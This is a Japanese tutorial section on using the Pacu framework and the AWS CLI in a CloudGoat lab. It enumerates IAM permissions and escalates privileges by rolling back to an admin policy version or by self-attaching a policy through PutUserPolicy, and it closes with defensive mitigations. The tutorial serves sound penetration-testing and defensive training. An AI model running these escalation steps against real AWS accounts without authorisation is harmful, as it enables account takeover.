## PACUによるIAM列挙・PrivEscスキャンのチュートリアル

前節までで「クラウド攻撃者が何を狙うか」を学んだ。本節では、その代表的な攻撃フレームワークである **Pacu**（パキュー、Rhino Security Labs製のAWS特化型ペネトレーションテストツール）を使って、実際にIAM権限を列挙し、権限昇格（PrivEsc: Privilege Escalation、低権限のIAMアイデンティティが本来許可されていないはずの高権限操作に到達すること）経路を発見するまでの一連の流れを、コマンドと出力の実例で追う。演習環境には **CloudGoat**（Rhino Security Labsが提供する「意図的に脆弱なAWS環境」構築ツール）を用いる。

本節は防御的教育目的であり、実施はすべて自分で作成したCloudGoat環境やIAMサンドボックスなど、権限を持つ検証環境に限定すること。実在の第三者アカウント・本番環境に対してこれらの手順を無許可で行うことは、AWSの利用規約および各国の不正アクセス関連法に抵触する。

### Pacuとは何か、そしてなぜ列挙が起点になるのか

Pacuは「AWS攻撃的セキュリティフレームワーク」であり、**モジュール**（列挙・攻撃・持続化などの機能を担う個別のPythonスクリプト）と、**永続的なセッション**（収集した認証情報・列挙結果をローカルのSQLiteデータベースに保存する作業単位）を中心に設計されている。よく比較されるProwlerなどの設定監査ツールが「このAWSアカウントの設定はベストプラクティスに沿っているか」を問うのに対し、Pacuは「いま手元にあるこの認証情報で、実際に何ができるか」という攻撃者視点の問いに答えることに特化している。この違いは重要で、IAMポリシーは複雑に組み合わさるため、ポリシードキュメントを目で読むだけでは実効権限を正確に把握できないことが多い。Pacuは対象の認証情報でAWS APIを実際に叩き、成功したAPI呼び出しの結果を積み上げることで「確認された権限（Confirmed Permissions）」を構築していく。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu

### インストールとセッションの作成

現在推奨されるインストール方法は、GitHubリポジトリから `pipx`（Pythonアプリケーションを隔離環境にインストールするツール）を使う方式である。

```bash
pipx install git+https://github.com/RhinoSecurityLabs/pacu.git
pacu --version
# 出力例: Pacu 1.7.0
```

この手順はPacu 1.7.0、Python 3.13.12、AWS CLI 2.36.17の組み合わせで検証されている。バージョンが異なると出力フォーマットやモジュール引数が変わることがあるため、実施前に `pacu --help` や各モジュールの `--module-info` で最新仕様を確認する習慣が必要である（ツールは活発に更新されるため、本節のコマンド例が将来のバージョンでそのまま動く保証はない）。インストール後、ローカルの列挙結果やセッションデータは `~/.local/share/pacu/` 以下のSQLiteデータベースに保存される。これは裏を返せば、Pacuを実行したホスト自体に機微な列挙結果（IAMユーザー名、ARN、確認された権限一覧など）が平文に近い形で残るということであり、検証後にホストを適切に破棄・クリーニングする運用が望ましい。

セッションは案件（エンゲージメント）ごとに分離して作成する。これにより異なる対象の認証情報や列挙結果が混在しない。

```bash
# セッションの新規作成
pacu --new-session glc-pacu-cg-rollback
# 出力: Session glc-pacu-cg-rollback created.

# セッションの有効化
pacu --session glc-pacu-cg-rollback --activate-session

# 認証情報のインポート（ローカルのAWS CLIプロファイル "raynor" から取り込む例）
pacu --session glc-pacu-cg-rollback --import-keys raynor
# 出力: Imported keys as "imported-raynor"

# 対象リージョンの設定
pacu --session glc-pacu-cg-rollback --set-regions us-east-1
# 出力: Session regions changed: ['us-east-1']
```

`--import-keys` はローカルの `~/.aws/credentials` に設定済みのプロファイル名を指定してPacuに取り込む方式で、STSの一時トークン（AssumeRoleなどで発行されるアクセスキー・シークレットキー・セッショントークンの組）を使う場合はトークンも欠かさずインポートする必要がある。トークンを忘れると、後続のAPI呼び出しが認証エラーで失敗し、列挙結果が正しく取得できない典型的なトラブルとなる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 演習シナリオ: CloudGoatの iam_privesc_by_rollback

GoLinuxCloudの記事では、CloudGoatが提供する `iam_privesc_by_rollback` シナリオを使って一連の流れを実演している。このシナリオを選ぶ理由は、IAMのみに焦点を絞った小規模構成でありながら、「たった1つのIAMアクション（ポリシーバージョンの切り替え）だけで実効アクセスが劇的に変化する」という権限昇格の本質を、余計な要素なく明確に説明できる点にある。

```bash
cloudgoat create iam_privesc_by_rollback --profile default
```

このシナリオが作るIAMユーザー（例: `raynor-cgidXXXXXXXX`）には、カスタマー管理ポリシーの**5つのバージョン**が用意される。**デフォルトのバージョン**（AWSでは1つのIAMポリシーに対して最大5世代までバージョン履歴を保持でき、そのうち1つが「デフォルト」として実効適用される仕組みになっている）は「IAMの読み取り系（Get/List）権限」と「`iam:SetDefaultPolicyVersion`」のみを許可する。ところが**古いバージョン**の中には、`"Action": "*", "Resource": "*"` というフル管理者権限を許可する内容がそのまま削除されずに残っている。つまり、ユーザー自身には強い権限がなくても、「過去に付与されていた強い権限のスナップショット」を呼び戻す権利だけは与えられている、という設計ミスがここでの脆弱性の核心である。

#### なぜこれが成立するのか(仕組みレベルの説明)

IAMのカスタマー管理ポリシーは、S3のオブジェクトバージョニングに似た仕組みでバージョン管理される。`PutPolicy`相当の更新のたびに新しいバージョン（v1, v2, v3…）が作成され、そのうち1つが `IsDefaultVersion: true` としてマークされ、実際にプリンシパル（IAMユーザーやロール)に対して評価されるのはこの「デフォルトバージョン」のドキュメントだけである。`iam:SetDefaultPolicyVersion` アクションは、既存のバージョンの中からどれをデフォルトにするかを切り替える権限であり、新しいポリシーを作成する権限（`iam:CreatePolicyVersion`）とは別物である。したがって「ポリシーの新規作成・変更はできないが、既存バージョンの切り替えだけはできる」という一見無害に見える権限を持つユーザーが、過去に存在した高権限バージョンへロールバックするだけで、実質的に管理者権限を手にできてしまう。これがPacuの `iam__privesc_scan` モジュールが `SetExistingDefaultPolicyVersion` という名称で検知する昇格経路であり、AWS IAMの「バージョン履歴を明示的に削除しない限り残り続ける」という仕様と、「デフォルトバージョンの切り替えという一見軽微に見える操作を許可してしまう」ポリシー設計ミスが組み合わさって生まれる典型的なPrivEscパターンである。

### IAM列挙モジュールの実行

まずアカウント全体の基本情報を列挙する。

```bash
pacu --session glc-pacu-cg-rollback --module-name aws__enum_account --exec
```

```
[aws__enum_account] Enumerating Account: <No IAM Alias defined>
Account Information:
    Account ID: 111122223333
    Key Arn: arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX
```

これはAWS CLIの `aws sts get-caller-identity --profile raynor` と同等の情報をPacuのデータストアに保存する操作であり、以降のモジュールがこの情報を再利用する。

利用可能なモジュール一覧は次で確認できる。

```bash
pacu --list-modules
```

出力には機能カテゴリ別の分類が表示され、**ESCALATE**（権限昇格系。`cfn__resource_injection`、`iam__privesc_scan` など）と**ENUM**（列挙系。`aws__enum_account`、`iam__enum_permissions`、`iam__enum_users`など）に大別される。列挙(ENUM)を先に行い、その結果を使って昇格(ESCALATE)候補を探す、という二段階の流れがPacuの基本設計思想である。

次に、現在の認証情報が実際に何を許可されているかを確認する `iam__enum_permissions` を実行する。

```bash
pacu --session glc-pacu-cg-rollback --module-name iam__enum_permissions --exec
```

```
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   raynor-cgidXXXXXXXX...
[iam__enum_permissions]     Confirmed Permissions for raynor-cgidXXXXXXXX

  66 Confirmed permissions for user: raynor-cgidXXXXXXXX.
   0 Unconfirmed permissions for 0 user(s).
```

このモジュールは、対象ユーザーにアタッチされたインラインポリシー・管理ポリシーをIAM API経由で取得し、それらのステートメントを解析して「実際に許可されているアクションの集合」を組み立てる。ここで重要なのは「Confirmed（確認済み）」と「Unconfirmed（未確認）」の区別である。対象ユーザー自身がIAMポリシーを読み取る権限を持たない場合、Pacuはポリシー内容を直接取得できず、代わりに個々のAPIを実際に試行して成否から権限の有無を推測する「ブルートフォース的確認」に頼らざるを得ない。この場合は権限一覧が不完全になりうるため、レポートには「未確認」の状態であることを明記し、過信しないことが実務上重要である。

続いて `whoami` で、確認済み権限の詳細をJSON形式で確認する。

```bash
pacu --session glc-pacu-cg-rollback --whoami
```

```json
{
  "UserName": "raynor-cgidXXXXXXXX",
  "Arn": "arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX",
  "AccountId": "111122223333",
  "KeyAlias": "imported-raynor",
  "PermissionsConfirmed": true,
  "Permissions": {
    "Allow": {
      "iam:listpolicyversions": { "Resources": ["*"] },
      "iam:getpolicyversion": { "Resources": ["*"] },
      "iam:setdefaultpolicyversion": { "Resources": ["*"] }
    },
    "Deny": {}
  }
}
```

`PermissionsConfirmed: true` は、Pacuがこのアイデンティティに付随するIAMポリシードキュメントを直接読み取り、静的解析によって権限セットを構築できたことを意味する。ただし、この判定はSCP（Service Control Policy、AWS Organizations配下のアカウントに組織全体で強制される追加の制約）や、リソースベースポリシー、IAM Condition句（時刻・IPアドレス・MFA有無などによる実行時条件）を考慮していない点に注意が必要である。つまり「Pacuが許可されていると判定した=実行時に必ず成功する」ではなく、あくまで「ポリシードキュメント上は許可に見える」という静的な結果であり、最終的な検証は実際のAPI呼び出し（後述のAWS CLI検証）で行う必要がある。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### iam__privesc_scanモジュールによる昇格経路の発見

列挙結果をもとに、権限昇格の可能性を体系的にチェックするのが `iam__privesc_scan` モジュールである。このモジュールは、AWS IAMで知られている数十種類の権限昇格パターン（例: `iam:PutUserPolicy` による自己へのポリシー付与、`iam:AttachUserPolicy` による管理ポリシーの直接アタッチ、`iam:CreatePolicyVersion` による既存ポリシーの上書き、そして本シナリオの `iam:SetDefaultPolicyVersion` によるロールバックなど）と、対象アイデンティティの確認済み権限を突き合わせ、一致するパターンを報告する。

実務での利用では、対象環境に実際に変更を加えず調査だけを行う **`--scan-only`** フラグの使用が強く推奨される。これを付けない場合、Pacuは検出した昇格経路を実際に「実行」しようとする動作をとりうるため、許可されたペネトレーションテストのルール・オブ・エンゲージメント（RoE、テスト実施範囲や許可される操作を定めた合意事項）を超えた変更を対象環境に加えてしまうリスクがある。教育・検証目的であっても、まず `--scan-only` で「何が可能か」を把握し、実際に権限昇格を実演する場合も自分の管理下にあるサンドボックス環境に限定すべきである。

```bash
pacu --session glc-pacu-cg-rollback --module-name iam__privesc_scan \
  --module-args='--scan-only' --exec
```

```
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: SetExistingDefaultPolicyVersion

[iam__privesc_scan] MODULE SUMMARY:
  Scan Complete
```

`CONFIRMED` という表示は、Pacuが単に理論上の可能性を示しているのではなく、必要な権限が実際に確認済み権限セットの中に存在すると判定したことを意味する（対する `POTENTIAL` は、権限が「未確認」カテゴリに含まれており実際に試すまで確証が持てない場合に使われる区分である）。

モジュールの詳細説明は次で取得できる。

```bash
pacu --module-name iam__privesc_scan --module-info
```

この出力には次のような重要な注意書きが含まれる。

> 「このモジュールはNotActionsの解析に難しさを抱えています。ユーザーがNotActionsを持つ場合は、モジュール結果の手動検証を推奨します。」

**NotAction**（IAMポリシーで「列挙したアクション以外の全アクションを対象にする」という否定形の指定方法）を含むポリシーは、`Action` による肯定形の列挙とは評価ロジックが大きく異なり、単純なパターンマッチでは正確に解析しきれない。`whoami` の出力でNotActionに由来する権限は先頭に `!` が付与されて表示されるため、これが見えた場合はPacuの判定を鵜呑みにせず、必ずAWS CLIなど実際のAPI呼び出しで裏取りする必要がある。この注意は、自動化ツール全般に共通する重要な教訓でもある。ツールが提示する「昇格候補」はあくまで仮説であり、最終的な確証は実際の環境での検証によってのみ得られる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 発見した経路の検証(AWS CLIによる裏取り)

Pacuが提示した「デフォルトポリシーバージョンのロールバック」という仮説を、AWS CLIで一つずつ裏取りする。この段階を踏むことで、レポートに「実際に確認された事実」として記載できる証跡が揃う。

まず、対象ユーザーにアタッチされているカスタマー管理ポリシーを確認する。

```bash
aws iam list-attached-user-policies --user-name raynor-cgidXXXXXXXX \
  --profile raynor
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-cgidXXXXXXXX",
            "PolicyArn": "arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX"
        }
    ]
}
```

そのポリシーのバージョン履歴を一覧する。

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --profile raynor
```

```json
{
    "Versions": [
        {"VersionId": "v5", "IsDefaultVersion": false},
        {"VersionId": "v4", "IsDefaultVersion": false},
        {"VersionId": "v3", "IsDefaultVersion": false},
        {"VersionId": "v2", "IsDefaultVersion": false},
        {"VersionId": "v1", "IsDefaultVersion": true}
    ]
}
```

非デフォルトのバージョン(例としてv3)の中身を見て、実際にフル管理者権限が含まれているかを確認する。

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --version-id v3 --profile raynor
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [{
                "Action": "*",
                "Effect": "Allow",
                "Resource": "*"
            }]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false
    }
}
```

想定どおり、v3は `"Action": "*", "Resource": "*"` という無制限の管理者権限を許可する内容であることが確認できた。

昇格前の状態として、現在のデフォルトバージョン(v1)では権限が不足していることを確認しておく(この段階を踏むことで「昇格の前後」の対比がレポート上で明確になる)。

```bash
aws s3 ls --profile raynor
# エラー出力: AccessDenied: User is not authorized to perform: s3:ListAllMyBuckets
```

ここで、検証環境の管理者として許可した範囲内で、デフォルトバージョンをv3へ切り替える。

```bash
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --version-id v3 --profile raynor
```

このコマンドは成功時に出力を返さない(HTTP 200のみ)。切り替えが反映されたことを確認する。

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::111122223333:policy/cg-raynor-policy-cgidXXXXXXXX \
  --profile raynor --query 'Policy.DefaultVersionId' --output text
# 出力: v3
```

最後に、管理者権限を得たことの最小限の実証として、IAMユーザーの作成・削除を行う(検証用の使い捨てリソースであり、確認後すぐに削除して環境をクリーンな状態に戻す)。

```bash
aws iam create-user --user-name glc-pacu-proof-admin --profile raynor
```

```json
{
    "User": {
        "UserName": "glc-pacu-proof-admin",
        "Arn": "arn:aws:iam::111122223333:user/glc-pacu-proof-admin"
    }
}
```

```bash
aws iam delete-user --user-name glc-pacu-proof-admin --profile raynor
```

権限昇格後にPacuで再度 `iam__enum_permissions` を実行すると、確認された権限の数が **66件からおよそ15,319件へと激増**し、`*:*` (全アクション・全リソース許可)と一致する内容になる。この件数の劇的な変化そのものが、レポートにおける説得力のある「Before/After」の証拠となる。

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### もう一つの典型パターン: iam:Put* によるインラインポリシーの自己付与

Pwned Labsの記事では、SetDefaultPolicyVersionとは異なるもう一つの代表的な昇格パターンが紹介されている。対象ユーザーに次のような権限が付与されているケースである。

```json
"Action": [
  "iam:Get*",
  "iam:List*",
  "iam:Put*",
  "iam:SimulateCustomPolicy",
  "iam:SimulatePrincipalPolicy"
]
```

ここで核心となるのは `iam:Put*` である。この権限には `iam:PutUserPolicy`(指定したIAMユーザーにインラインポリシーを直接追加するAPI)が含まれる。IAMユーザーが自分自身に対してこのAPIを呼び出せる場合、そのユーザーは自分自身に「フル管理者権限を許可するインラインポリシー」を追加でき、即座に管理者相当のアクセスへ昇格できてしまう。これは前述のバージョンロールバック型とは異なり、「新しい高権限ポリシーをその場で作成して自分にアタッチする」という直接的な自己昇格パターンであり、IAM関連の権限昇格の中でも最も基本的かつ発生頻度の高い類型の一つである。

Pwned Labsの記事で示されたPacuでの検出・実演フローは次のとおりである(手順の骨格)。

```
set_keys                      # 対象ユーザーの認証情報をPacuにセット
whoami                        # 現在のユーザーと権限を確認
run iam__enum_permissions     # 権限列挙
run iam__privesc_scan         # 昇格ベクトルのスキャン
```

`iam__privesc_scan` はここで `iam:Put*` の存在から昇格ベクトルを検出し、実行を許可すると`PutUserPolicy`を用いて管理者権限相当のインラインポリシーを自動的に作成・添付する。添付後に再度 `whoami` を実行すると、確認された権限が「すべてのリソースへの許可」を含む状態に変化していることが確認できる。ここでの教訓は、`Get*` や `List*` のような一見安全そうな読み取り系ワイルドカードに `Put*` を安易に混在させると、意図せず書き込み系の危険なAPI(この場合は自己へのポリシー付与)まで許可してしまうという、**ワイルドカード権限付与の危険性**である。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu

### セッションデータの確認とレポート化

列挙・検証の過程でPacuに蓄積されたセッションデータは、次のコマンドでいつでも一覧できる。

```bash
pacu --session glc-pacu-cg-rollback --data all
```

```
Session data:
aws_keys: [
    <AWSKey: imported-raynor>
]
name: "glc-pacu-cg-rollback"
key_alias: "imported-raynor"
session_regions: [
    "us-east-1"
]
Account: {
    "account_id": "111122223333",
    "account_iam_alias": "<No IAM Alias defined>"
}
```

実務でIAM PrivEscを報告する際は、単に「昇格できた」で終わらせず、次の要素を必ず揃えることが望ましい。

| 記載項目 | 記入例 |
|---|---|
| 使用したコマンド/モジュール | `iam__enum_permissions` → `iam__privesc_scan --scan-only` |
| 開始時点のアイデンティティ | `arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX` |
| 確認された権限 | IAM Get/List + `iam:SetDefaultPolicyVersion` |
| 対象リソース | カスタマー管理ポリシー `cg-raynor-policy-cgidXXXXXXXX` |
| 観察された事実 | 非デフォルトバージョンv3が `*:*` を許可 |
| 結果 | デフォルトバージョンをv3に変更、`iam:CreateUser`が成功 |
| AWS上の証跡 | `get-policy-version`、`get-policy`、ユーザー作成/削除の記録 |
| CloudTrailでの裏付け | `SetDefaultPolicyVersion` および `CreateUser` イベントの有無 |
| 影響 | 開始時点の低権限ユーザーが、管理者権限で任意の操作を実行可能になる |

### よくあるトラブルとその原因

| 症状 | 主な原因 | 対処 |
|---|---|---|
| 列挙後に権限が全く見えない | 対象アイデンティティ自身がIAMポリシーを読み取る権限を持たない、SCPや条件句が存在、モジュールが未対応 | 管理者権限でアタッチ済みポリシーを直接確認する、列挙を再実行する、不明な点は「未確認」として扱い断定しない |
| Pacuが提示した昇格候補が実行時に失敗する | リソース単位の制限、Condition句、Permissions Boundary(権限境界)、信頼ポリシー、SCP、サービス固有の前提条件など、静的なポリシー解析では捉えきれない要素が存在 | ポリシードキュメントを再読する、AWS CLIで実際のAPIを正確にテストする、使用したモジュールのバージョンを記録しておく |
| 一時認証情報でエラーになる | STSのセッショントークンが未インポートまたは期限切れ | セッショントークンも含めて再インポートする、STSの出力を都度取得し直す |
| リージョン指定のモジュールが空の結果を返す | Pacuセッションのリージョン設定が対象と一致していない | `--set-regions` で正しいリージョン、または `all` を指定する |
| Pacuの結果とAWS CLIの結果が食い違う | セッションデータが古い、あるいは異なる認証情報を参照している | `whoami` と `aws sts get-caller-identity` の結果を突き合わせて一致を確認し、列挙をやり直す |
| 古いブログ記事のコマンドが通らない | Pacuのインストール方法やCLIフラグが版によって変わっている | 使用しているバージョンの `pacu --help` および各モジュールの `--module-info` で最新の仕様を必ず確認する |

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 防御側の視点: これらの経路をどう塞ぐか

本節で扱った2つのPrivEscパターンは、いずれもIAMポリシー設計における共通の失敗類型を示している。防御側が講じるべき対策は次のとおりである。

1. **最小権限の徹底**: `iam:Put*` や `iam:*` のようなワイルドカードでのアクション付与を避け、業務上必要な個別アクションのみを明示的に許可する。特にIAM関連の書き込み系アクション(`PutUserPolicy`、`AttachUserPolicy`、`CreatePolicyVersion`、`SetDefaultPolicyVersion` など)は、それ単体で権限昇格につながりうるため、付与前に必ず昇格経路の観点でレビューする。
2. **不要な権限昇格系アクションの削除**: `iam:SetDefaultPolicyVersion` は、ポリシーのロールバック運用に本当に必要な場合以外は付与しない。運用上必要な場合も、対象を特定のポリシーARNに絞る(`Resource`フィールドでワイルドカードを避ける)ことで影響範囲を限定できる。
3. **不要な古いポリシーバージョンの削除**: IAMポリシーは最大5世代のバージョンを保持できるが、過去に一時的に付与した高権限バージョンが削除されずに残っていると、それ自体が権限昇格の踏み台になる。定期的にポリシーバージョン履歴を棚卸しし、不要な高権限バージョンは `iam:DeletePolicyVersion` で削除する。
4. **AWS Access Analyzerや定期監査の活用**: AWS IAM Access Analyzerや、Pacu自身のようなツールを防御側が自ら定期的に実行し、権限昇格が可能な組み合わせが存在しないかを継続的に検査する。攻撃者が使うツールを防御側が先に自環境に対して実行する「purple team」的な運用は、この種の設定ミスの早期発見に有効である。
5. **Service Control Policies(SCP)による組織レベルの制御**: AWS Organizationsを利用している場合、SCPでアカウント全体に対して危険な昇格系アクションを制限することで、個々のIAMポリシーの設定ミスがあってもSCPが最終防波堤として機能する。
6. **CloudTrailによる監視**: `SetDefaultPolicyVersion`、`PutUserPolicy`、`AttachUserPolicy`、`CreatePolicyVersion` など昇格に直結するIAM書き込みイベントをCloudTrailで継続的に監視し、異常な発生パターン(例: 短時間での連続実行、通常業務では発生しないユーザーによる実行)にアラートを設定する。

これらの対策は個別の脆弱性を塞ぐというより、「IAMポリシーの実効権限は静的な一見からは把握しづらく、Pacuのようなツールによる能動的な検証を継続的に行わない限り見落とされやすい」という構造的な教訓に基づいている。防御側もまた、攻撃者と同じ列挙・スキャンの視点を定期的に自環境へ向けることが、この種の権限昇格経路を未然に発見する最も実践的な方法である。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu
